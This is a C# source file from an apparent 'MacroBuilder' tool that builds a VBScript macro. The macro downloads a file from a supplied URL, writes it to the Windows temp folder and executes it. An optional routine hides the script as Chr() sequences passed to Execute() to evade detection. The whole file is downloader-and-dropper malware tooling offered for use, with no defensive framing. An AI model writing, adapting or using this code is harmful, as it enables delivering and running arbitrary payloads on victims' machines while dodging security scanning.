using System.Text;

namespace MacroBuilder.Core
{
    public class MacroGenerator
    {
        public static string GenerateMacroCode(string fileUrl, string fileName, bool obfuscation)
        {
            string vbScriptTemplate = $@"
Dim h: Set h = CreateObject(""Microsoft.XMLHTTP"")
Dim s: Set s = CreateObject(""Adodb.Stream"")
h.Open ""GET"", ""{fileUrl}"", False
h.Send
f = CreateObject(""Scripting.FileSystemObject"").GetSpecialFolder(2) + ""/{fileName}""
With s
    .Type = 1
    .Open
    .write h.responseBody
    .savetofile f, 2
End With
Set shell = CreateObject(""WScript.Shell"")
shell.Run f, 1, False";

            if (obfuscation)
            {
                return SimpleObfuscateCode(vbScriptTemplate);
            }
            else
            {
                return vbScriptTemplate;
            }
        }

        private static string SimpleObfuscateCode(string vbsCode)
        {
            StringBuilder obfuscatedCode = new StringBuilder();
            foreach (char ch in vbsCode)
            {
                obfuscatedCode.Append($"Chr({(int)ch})&");
            }

            if (obfuscatedCode.Length > 0)
            {
                obfuscatedCode.Length--;
            }

            return $"Execute({obfuscatedCode.ToString()})";
        }
    }
}
